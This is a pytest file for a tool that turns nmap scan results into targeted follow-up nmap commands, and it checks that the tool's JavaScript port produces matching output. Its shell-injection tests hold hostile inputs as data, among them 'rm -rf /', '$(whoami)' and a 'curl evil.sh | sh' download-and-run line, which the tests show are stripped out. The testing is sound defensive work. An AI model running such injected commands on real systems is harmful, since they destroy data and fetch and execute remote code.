"""Turning a finished scan into the nmap command that scans only what it found.

The module is pure, so almost everything here is built from plain tuples of
``(address, protocol, port, state)`` -- with an optional fifth element, the
hostname -- rather than from a fixture file.
"""

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from xnp import rescan

pytestmark = pytest.mark.usefixtures("quiet_logs")

SERVICE = "-sV -sC --version-all -Pn"


def one(targets, args=SERVICE, states=("open",)):
    """The single command a set of targets is expected to produce."""
    built = rescan.commands(targets, args, states)
    assert len(built) == 1
    return built[0].command


# --- Grouping ---------------------------------------------------------------

def test_hosts_with_the_same_ports_share_one_command():
    command = one([("10.0.0.5", "tcp", 22, "open"), ("10.0.0.5", "tcp", 80, "open"),
                   ("10.0.0.9", "tcp", 22, "open"), ("10.0.0.9", "tcp", 80, "open")])
    assert command.endswith("-p 22,80 10.0.0.5 10.0.0.9")


def test_a_different_port_set_gets_its_own_command():
    built = rescan.commands([("10.0.0.5", "tcp", 22, "open"),
                             ("10.0.0.9", "tcp", 22, "open"),
                             ("10.0.0.9", "tcp", 80, "open")], SERVICE, ("open",))
    assert len(built) == 2
    assert {command.group.hosts for command in built} == {("10.0.0.5",), ("10.0.0.9",)}


def test_the_ports_come_out_sorted_and_deduplicated():
    command = one([("10.0.0.5", "tcp", 443, "open"), ("10.0.0.5", "tcp", 22, "open"),
                   ("10.0.0.5", "tcp", 443, "open"), ("10.0.0.5", "tcp", 80, "open")])
    assert "-p 22,80,443 " in command


def test_the_hosts_are_ordered_numerically_not_as_strings():
    command = one([("10.0.0.20", "tcp", 22, "open"), ("10.0.0.9", "tcp", 22, "open")])
    assert command.endswith("10.0.0.9 10.0.0.20")


def test_the_groups_are_ordered_by_how_many_hosts_they_carry():
    built = rescan.commands([("10.0.0.1", "tcp", 80, "open"),
                             ("10.0.0.2", "tcp", 22, "open"),
                             ("10.0.0.3", "tcp", 22, "open")], SERVICE, ("open",))
    assert [len(command.group.hosts) for command in built] == [2, 1]


def test_nothing_open_produces_no_commands():
    assert rescan.commands([("10.0.0.5", "tcp", 22, "closed")], SERVICE, ("open",)) == []


# --- Protocols --------------------------------------------------------------

def test_tcp_and_udp_land_in_one_command_with_the_t_and_u_syntax():
    command = one([("10.0.0.5", "tcp", 443, "open"), ("10.0.0.5", "udp", 53, "open")])
    assert "-p T:443,U:53 " in command


def test_a_udp_only_group_prefixes_its_ports():
    assert "-p U:161 " in one([("10.0.0.5", "udp", 161, "open")])


def test_a_mixed_group_also_carries_a_tcp_scan_type():
    # -sU with no TCP type makes nmap ignore the T: half of the spec.
    command = one([("10.0.0.5", "tcp", 80, "open"), ("10.0.0.5", "udp", 53, "open")],
                  args="-A -Pn")
    assert "-sS" in command and "-sU" in command


def test_a_tcp_only_group_is_left_to_nmaps_own_default():
    # Adding -sS here would force sudo for no reason: nmap picks -sS as root
    # and -sT otherwise all by itself.
    command = one([("10.0.0.5", "tcp", 80, "open")], args="-sV -Pn")
    assert "-sS" not in command and "-sT" not in command


def test_a_udp_only_group_carries_no_tcp_scan_type():
    command = one([("10.0.0.5", "udp", 161, "open")], args="-sS -Pn -n --reason")
    assert "-sS" not in command and "-sU" in command


def test_a_tcp_only_group_never_carries_su():
    assert "-sU" not in one([("10.0.0.5", "tcp", 80, "open")], args="-sV -sU -Pn")


def test_a_connect_scan_in_the_profile_is_not_replaced_by_a_syn_scan():
    command = one([("10.0.0.5", "tcp", 80, "open"), ("10.0.0.5", "udp", 53, "open")],
                  args="-sT -Pn")
    assert "-sT" in command and "-sS" not in command


def test_a_protocol_that_is_not_tcp_or_udp_is_not_a_port():
    assert rescan.commands([("10.0.0.5", "sctp", 80, "open")], SERVICE, ("open",)) == []


# --- Address families -------------------------------------------------------

def test_ipv6_hosts_never_share_a_command_with_ipv4():
    built = rescan.commands([("10.0.0.5", "tcp", 80, "open"),
                             ("2001:db8::1", "tcp", 80, "open")], SERVICE, ("open",))
    assert len(built) == 2


def test_an_ipv6_group_carries_dash_six():
    assert "-6" in one([("2001:db8::1", "tcp", 80, "open")])


def test_a_profile_that_already_carries_dash_six_does_not_get_it_twice():
    command = one([("2001:db8::1", "tcp", 80, "open")], args="-sV -6 -Pn")
    assert command.split().count("-6") == 1


def test_dash_six_is_dropped_from_an_ipv4_command():
    command = one([("10.0.0.5", "tcp", 80, "open")], args="-sV -6 -Pn")
    assert "-6" not in command


# --- What the profile is not allowed to decide ------------------------------

@pytest.mark.parametrize("flag", ["-p-", "-p 80", "-p1-1000", "-F", "--top-ports 100",
                                  "--exclude-ports 22"])
def test_a_port_spec_in_the_profile_is_dropped(flag):
    command = one([("10.0.0.5", "tcp", 443, "open")], args=f"-sV {flag} -Pn")
    assert command.count("-p ") == 1
    assert command.endswith("-p 443 10.0.0.5")


@pytest.mark.parametrize("flag", ["-sn", "-sL", "-sP", "-sO"])
def test_a_scan_that_takes_no_port_list_is_dropped(flag):
    assert flag not in one([("10.0.0.5", "tcp", 443, "open")], args=f"-sV {flag} -Pn")


def test_only_what_actually_vanished_is_reported_as_dropped():
    # -sS is put back on a TCP group, so warning about it would be a lie.
    built = rescan.commands([("10.0.0.5", "tcp", 80, "open"),
                             ("10.0.0.5", "udp", 53, "open")], "-sS -p- -Pn", ("open",))
    assert built[0].dropped == ("-p-",)


def test_a_scan_type_the_group_had_no_use_for_is_reported_as_dropped():
    built = rescan.commands([("10.0.0.5", "udp", 161, "open")], "-sS -Pn", ("open",))
    assert built[0].dropped == ("-sS",)


# --- States -----------------------------------------------------------------

def test_only_the_configured_states_are_rescanned():
    targets = [("10.0.0.5", "tcp", 80, "open"), ("10.0.0.5", "tcp", 81, "closed"),
               ("10.0.0.5", "tcp", 82, "filtered")]
    assert one(targets, states=("open",)).endswith("-p 80 10.0.0.5")


def test_open_filtered_is_included_when_the_config_asks_for_it():
    targets = [("10.0.0.5", "udp", 161, "open|filtered")]
    assert rescan.commands(targets, SERVICE, ("open",)) == []
    assert "-p U:161 " in one(targets, states=("open", "open|filtered"))


# --- Variables --------------------------------------------------------------

def test_a_group_variable_is_replaced_without_breaking_the_group():
    command = one([("10.0.0.5", "tcp", 22, "open"), ("10.0.0.9", "tcp", 22, "open")],
                  args="-sV -oN scan-$[PORTS].txt -Pn")
    assert command == "nmap -sV -oN scan-22.txt -Pn -p 22 10.0.0.5 10.0.0.9"


def test_the_tcp_and_udp_halves_have_a_variable_of_their_own():
    command = one([("10.0.0.5", "tcp", 80, "open"), ("10.0.0.5", "udp", 53, "open")],
                  args="-sV -oN t$[TCP_PORTS]-u$[UDP_PORTS].txt -Pn")
    assert "-oN t80-u53.txt " in command


def test_an_address_variable_splits_the_group_into_one_command_per_host():
    # -oA with a shared name would have every command of the group overwrite
    # the previous one's files, so the group stops being shared.
    built = rescan.commands([("10.0.0.5", "tcp", 22, "open"),
                             ("10.0.0.9", "tcp", 22, "open")],
                            "-sV -oA out/$[IP] -Pn", ("open",))
    assert [item.command for item in built] == [
        "nmap -sV -oA out/10.0.0.5 -Pn -p 22 10.0.0.5",
        "nmap -sV -oA out/10.0.0.9 -Pn -p 22 10.0.0.9",
    ]


def test_the_hostname_variable_uses_the_name_the_scan_resolved():
    command = one([("10.0.0.5", "tcp", 22, "open", "web.lab.local")],
                  args="-sV -oA out/$[HOSTNAME] -Pn")
    assert "-oA out/web.lab.local " in command


def test_a_host_with_no_name_falls_back_to_its_address():
    built = rescan.commands([("10.0.0.5", "tcp", 22, "open", "web.lab.local"),
                             ("10.0.0.9", "tcp", 22, "open")],
                            "-oA $[HOSTNAME]", ("open",))
    assert [item.command for item in built] == [
        "nmap -oA web.lab.local -p 22 10.0.0.5",
        "nmap -oA 10.0.0.9 -p 22 10.0.0.9",
    ]


def test_a_hostname_the_xml_made_up_never_reaches_the_command_line():
    # What is left is a recognisable name and nothing a shell reads: the
    # separators, the spaces and the slash are gone, not quoted.
    command = one([("10.0.0.5", "tcp", 22, "open", "web 01; rm -rf /.lab")],
                  args="-oA $[HOSTNAME]")
    assert command == "nmap -oA web01rm-rf.lab -p 22 10.0.0.5"


def test_a_name_made_only_of_dropped_characters_falls_back_to_the_address():
    command = one([("10.0.0.5", "tcp", 22, "open", "$(!!)")], args="-oA $[HOSTNAME]")
    assert command == "nmap -oA 10.0.0.5 -p 22 10.0.0.5"


def test_one_address_resolved_two_ways_picks_the_same_name_every_run():
    targets = [("10.0.0.5", "tcp", 22, "open", "web.lab.local"),
               ("10.0.0.5", "tcp", 80, "open", "alias.lab.local")]
    assert "-oA alias.lab.local " in one(targets, args="-oA $[HOSTNAME]")


def test_an_unknown_variable_is_left_in_the_command_rather_than_blanked_out():
    command = one([("10.0.0.5", "tcp", 22, "open")], args="-oA $[NOPE]")
    assert "$[NOPE]" in command
    assert rescan.unknown_variables("-oA $[NOPE] -oN $[IP]") == ("NOPE",)


def test_a_variable_inside_a_flags_value_does_not_confuse_the_splitter():
    # $[PORTS] expands to something that looks like a port spec; it must not
    # be read back as one and dropped.
    command = one([("10.0.0.5", "tcp", 22, "open")], args="-sV --script-args p=$[PORTS]")
    assert "--script-args p=22" in command


def test_a_group_built_without_names_still_answers_the_hostname_variable():
    # RescanGroup defaults names to (), so a group built by hand -- in a test,
    # or by code written before the variables -- must not raise on $[HOSTNAME].
    group = rescan.RescanGroup(family="ipv4", tcp=(22,), udp=(), hosts=("10.0.0.5",))
    assert rescan.build_command(group, "-oA $[HOSTNAME]")[0].startswith(
        "nmap -oA 10.0.0.5 ")


# --- Quoting ----------------------------------------------------------------

def test_the_quotes_an_author_wrote_are_the_quotes_that_come_out():
    # They may be load-bearing -- a path with a space in it needs them -- and
    # only whoever wrote the profile knows whether it has one.
    command = one([("10.0.0.5", "tcp", 22, "open")], args='-sV -oA "nmap/$[IP]"')
    assert command == 'nmap -sV -oA "nmap/10.0.0.5" -p 22 10.0.0.5'


def test_a_quoted_value_with_a_space_survives_the_substitution():
    command = one([("10.0.0.5", "tcp", 22, "open", "web.lab")],
                  args='-oA "scans/$[HOSTNAME] deep"')
    assert command == 'nmap -oA "scans/web.lab deep" -p 22 10.0.0.5'


def test_a_bare_token_is_left_bare_when_it_does_not_need_quoting():
    command = one([("10.0.0.5", "tcp", 22, "open")], args="-sV -oA nmap/$[IP]")
    assert command == "nmap -sV -oA nmap/10.0.0.5 -p 22 10.0.0.5"


def test_a_quote_inside_a_token_keeps_the_token_whole():
    command = one([("10.0.0.5", "tcp", 22, "open")],
                  args='-sV --script="vuln and safe"')
    assert '--script="vuln and safe"' in command


def test_an_unbalanced_quote_reaches_the_command_as_typed():
    # shlex.split would raise here; showing the line the author wrote is more
    # use than failing the run over their typo.
    command = one([("10.0.0.5", "tcp", 22, "open")], args='-oA "nmap/$[IP]')
    assert command == 'nmap -oA "nmap/10.0.0.5 -p 22 10.0.0.5'
    assert rescan.needs_root(command) is False


def test_a_flag_someone_quoted_is_still_read_as_that_flag():
    built = rescan.commands([("10.0.0.5", "udp", 161, "open")], '"-sS" -Pn', ("open",))
    assert built[0].dropped == ("-sS",)


def test_a_variable_free_profile_keeps_its_groups():
    assert not rescan.uses_per_host_variable(SERVICE)
    assert rescan.uses_per_host_variable("-oA $[IP]")
    assert rescan.uses_per_host_variable("-oA $[HOSTNAME]")


# --- The command line is a shell, and the XML is not ours -------------------

@pytest.mark.parametrize("hostile", [
    "10.0.0.1; rm -rf /",
    "10.0.0.1 && curl evil.sh | sh",
    "$(whoami)",
    "`id`",
    "10.0.0.1\nnmap evil.example",
    "10.0.0.999",
    "",
])
def test_an_address_that_is_not_an_address_never_reaches_the_command_line(hostile):
    built = rescan.commands([(hostile, "tcp", 80, "open"),
                             ("10.0.0.5", "tcp", 80, "open")], SERVICE, ("open",))
    assert len(built) == 1
    assert built[0].command.endswith("-p 80 10.0.0.5")


def test_a_port_that_is_not_a_port_is_dropped():
    targets = [("10.0.0.5", "tcp", "80; id", "open"), ("10.0.0.5", "tcp", 99999, "open"),
               ("10.0.0.5", "tcp", 80, "open")]
    assert one(targets).endswith("-p 80 10.0.0.5")


def test_quoted_script_arguments_survive_the_round_trip():
    command = one([("10.0.0.5", "tcp", 80, "open")],
                  args="-sV --script 'vuln and safe' -Pn")
    assert "--script 'vuln and safe'" in command


# --- Privileges -------------------------------------------------------------

@pytest.mark.parametrize("command,expected", [
    ("nmap -sS -p 80 10.0.0.5", True),
    ("nmap -sU -p U:53 10.0.0.5", True),
    ("nmap -A -p 80 10.0.0.5", True),
    ("nmap -sT -sV -p 80 10.0.0.5", False),
    ("nmap -sV -sC -Pn -p 80 10.0.0.5", False),
])
def test_a_raw_socket_scan_is_reported_as_needing_root(command, expected):
    assert rescan.needs_root(command) is expected


# --- Address validation itself ----------------------------------------------

@pytest.mark.parametrize("address,family", [
    ("10.0.0.5", "ipv4"), ("255.255.255.255", "ipv4"),
    ("2001:db8::1", "ipv6"), ("::1", "ipv6"),
    ("256.0.0.1", ""), ("10.0.0", ""), ("lab.local", ""), ("10.0.0.1 ", ""),
])
def test_the_family_is_only_reported_for_a_real_address(address, family):
    assert rescan.address_family(address) == family


# --- The JavaScript port ----------------------------------------------------
#
# The report carries its own copy of these rules, because the reader clicks a
# button in a file that has no Python behind it.  Two implementations of the
# same thing drift; this runs both over the same input and diffs the output.

#: Every case is (nmap arguments, [(address, protocol, port[, hostname])]).
SYNC_CASES = [
    ("-sV -sC --version-all -Pn", [("10.0.0.5", "tcp", 22), ("10.0.0.5", "tcp", 80),
                                   ("10.0.0.9", "tcp", 22), ("10.0.0.9", "tcp", 80)]),
    ("-sV -sC -Pn", [("10.0.0.3", "tcp", 443), ("10.0.0.3", "udp", 53),
                     ("10.0.0.20", "tcp", 5432)]),
    ("-A --script default,vuln -Pn", [("10.0.0.5", "tcp", 80), ("10.0.0.5", "udp", 53)]),
    ("-sS -Pn -n --reason", [("10.0.0.5", "udp", 161)]),
    ("-sT -Pn", [("10.0.0.5", "tcp", 80), ("10.0.0.5", "udp", 53)]),
    ("-sV -6 -p- -F --top-ports 100 -sn -Pn", [("2001:db8::1", "tcp", 80),
                                               ("10.0.0.5", "tcp", 80)]),
    ("-sV --script 'vuln and safe' -Pn", [("10.0.0.5", "tcp", 80)]),
    ("-sV -Pn", [("10.0.0.1; rm -rf /", "tcp", 80), ("$(id)", "tcp", 80),
                 ("10.0.0.999", "tcp", 80), ("10.0.0.20", "tcp", 80),
                 ("10.0.0.9", "tcp", 80)]),
    ("-sV -Pn", [("10.0.0.5", "tcp", 99999), ("10.0.0.5", "sctp", 80),
                 ("10.0.0.5", "tcp", 443)]),
    # Variables: group-level, per-host, unknown, and a hostname the XML made up.
    ("-sV -oN scan-$[PORTS].txt -Pn", [("10.0.0.5", "tcp", 22), ("10.0.0.9", "tcp", 22)]),
    ("-sV -oA out/$[IP] -Pn", [("10.0.0.5", "tcp", 22), ("10.0.0.9", "tcp", 22)]),
    ("-oA $[HOSTNAME]-t$[TCP_PORTS]-u$[UDP_PORTS]",
     [("10.0.0.5", "tcp", 22, "web 01; rm -rf /.lab"), ("10.0.0.5", "udp", 53, "WEB.lab"),
      ("10.0.0.9", "tcp", 22, "$(id)"), ("10.0.0.9", "udp", 53, "")]),
    ("-sV -oA $[NOPE] -Pn", [("10.0.0.5", "tcp", 22)]),
    # Quoting: written with quotes, written without, and left unbalanced.
    ('-sV -oA "nmap/$[IP]" -Pn', [("10.0.0.5", "tcp", 22), ("10.0.0.9", "tcp", 22)]),
    ('-oA "scans/$[HOSTNAME] deep"', [("10.0.0.5", "tcp", 22, "web.lab")]),
    ('-sV --script="vuln and safe" -Pn', [("10.0.0.5", "tcp", 80)]),
    ('-oA "nmap/$[IP]', [("10.0.0.5", "tcp", 22)]),
    ('"-sS" -Pn', [("10.0.0.5", "udp", 161)]),
]

HARNESS = """
var DATA = { rescan: null };
var state = { rescanProfile: "", rescanArgs: "" };
%s
JSON.parse(require("fs").readFileSync(0, "utf8")).forEach(function (testCase) {
  var rows = testCase.rows.map(function (r) {
    return { ip: r[0], protocol: r[1], num: r[2], hostname: r[3] };
  });
  commandsFor(rows, testCase.args).forEach(function (command) {
    console.log(command);
  });
});
"""


def javascript_block():
    """The report's port of this module, from its marker to the shape list."""
    source = (Path(rescan.__file__).parent / "data" / "report" / "report.js").read_text(
        encoding="utf-8")
    return source[source.index("  // --- Targeted rescan"):
                  source.index("  var TARGET_SHAPES = [")]


def test_no_two_functions_in_the_report_share_a_name():
    """The rescan block lives in the same scope as the rest of report.js.

    A second ``function render()`` does not shadow the first, it replaces it,
    and every call meant for the other one lands here instead -- which is a
    report whose script dies on load, and which the parity test above cannot
    see because it only runs this block.
    """
    import collections
    import re

    source = (Path(rescan.__file__).parent / "data" / "report" / "report.js").read_text(
        encoding="utf-8")
    names = re.findall(r"^  function (\w+)\(", source, re.MULTILINE)
    repeated = [name for name, count in collections.Counter(names).items() if count > 1]
    assert repeated == []


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_the_report_builds_the_same_commands_this_module_does(tmp_path):
    harness = tmp_path / "harness.js"
    harness.write_text(HARNESS % javascript_block(), encoding="utf-8")

    cases = [{"args": args, "rows": rows} for args, rows in SYNC_CASES]
    result = subprocess.run(["node", str(harness)], input=json.dumps(cases),
                            capture_output=True, text=True, check=True)

    expected = [command.command
                for args, rows in SYNC_CASES
                for command in rescan.commands(
                    [(row[0], row[1], row[2], "open") + tuple(row[3:]) for row in rows],
                    args, ("open",))]
    assert result.stdout.splitlines() == expected
